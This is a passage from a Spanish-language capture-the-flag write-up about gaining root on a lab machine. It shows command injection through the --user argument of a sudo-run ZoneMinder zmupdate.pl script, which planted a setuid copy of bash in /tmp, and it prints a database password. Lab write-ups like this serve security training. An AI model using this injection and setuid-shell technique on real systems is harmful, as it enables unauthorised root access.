</span></span></span><span class=line><span class=cl><span class=go>Command &#39;mysql -uzmuser -p&#39;ZoneMinderPassword2023&#39; -hlocalhost zm &lt; /usr/share/zoneminder/db/zm_update-1.30.1.sql&#39; exited with status: 1
</span></span></span></code></pre></div><ul><li>Noto que tambi√©n el script pregunta por un usuario y contrase√±a (posiblemente de la database que updatea). Luego de jugar, si paso un usuario y contrase√±a que en realidad sean comandos, hay un output que lo est√° interpretando:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --version 1 --user=&#39;$(id)&#39; -p=&#39;$(whoami)&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Initiating database upgrade to version 1.36.32 from version 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
</span></span></span><span class=line><span class=cl><span class=go>Press enter to continue or ctrl-C to abort :
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Do you wish to take a backup of your database prior to upgrading?
</span></span></span><span class=line><span class=cl><span class=go>This may result in a large file in /tmp/zm if you have a lot of events.
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;y&#39; for a backup or &#39;n&#39; to continue : y
</span></span></span><span class=line><span class=cl><span class=go>Creating backup to /tmp/zm/zm-1.dump. This may take several minutes.
</span></span></span><span class=line><span class=cl><span class=go>mysqldump: Got error: 1698: &#34;Access denied for user &#39;uid=0(root)&#39;@&#39;localhost&#39;&#34; when trying to connect
</span></span></span><span class=line><span class=cl><span class=go>Output:
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>de manera que el c√≥digo en la flag <code>--user</code> est√° siendo interpretado.</p><ul><li>Por ende, decido inyectar:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --version 1 --user=&#39;$(cp /usr/bin/bash /tmp/gunzf0x ; chmod 4755 /tmp/gunzf0x)&#39; -p=&#39;$(whoami)&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Initiating database upgrade to version 1.36.32 from version 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
</span></span></span><span class=line><span class=cl><span class=go>Press enter to continue or ctrl-C to abort :
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Do you wish to take a backup of your database prior to upgrading?
</span></span></span><span class=line><span class=cl><span class=go>This may result in a large file in /tmp/zm if you have a lot of events.
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;y&#39; for a backup or &#39;n&#39; to continue : y
</span></span></span><span class=line><span class=cl><span class=go>Creating backup to /tmp/zm/zm-1.dump. This may take several minutes.
</span></span></span><span class=line><span class=cl><span class=go>mysqldump: Got error: 1698: &#34;Access denied for user &#39;-p$(whoami)&#39;@&#39;localhost&#39;&#34; when trying to connect
</span></span></span><span class=line><span class=cl><span class=go>Output:
</span></span></span><span class=line><span class=cl><span class=go>Command &#39;mysqldump -u$(cp /usr/bin/bash /tmp/gunzf0x ; chmod 4755 /tmp/gunzf0x) -p&#39;$(whoami)&#39; -hlocalhost --add-drop-table --databases zm &gt; /tmp/zm/zm-1.dump&#39; exited with status: 2
</span></span></span></code></pre></div><p>De manera que, b√°sicamente, creo una copia de <code>/usr/bin/bash</code> llamada <code>/tmp/gunzf0x</code> y, al archivo que es la copia, le asigno el permiso <code>4755</code>.</p><ul><li>Decido chequear el directorio <code>/tmp</code> y esto funcion√≥:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ ls -la /tmp
</span></span></span><span class=line><span class=cl><span class=go>total 1468
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt 14 root       root          4096 Apr 19 01:48 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 18 root       root          4096 Nov  9 13:19 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root       root          4096 Apr 18 21:49 .ICE-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root       root          4096 Apr 18 21:49 .Test-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root       root          4096 Apr 18 21:49 .X11-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root       root          4096 Apr 18 21:49 .XIM-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root       root          4096 Apr 18 21:49 .font-unix
</span></span></span><span class=line><span class=cl><span class=go>-rwsr-xr-x  1 root       root       1396520 Apr 19 01:46 gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>De manera que finalmente ejecuto el binario malicioso como el propietario y nos convertimos en <code>root</code>, simplemente corriendo <code>/tmp/gunzf0x -p</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ /tmp/gunzf0x -p
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>gunzf0x-5.1# whoami
</span></span></span><span class=line><span class=cl><span class=go>root
</span></span></span></code></pre></div><p>donde, finalmente, podemos leer la flag de <code>root</code> en el directorio <code>/root</code>.</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>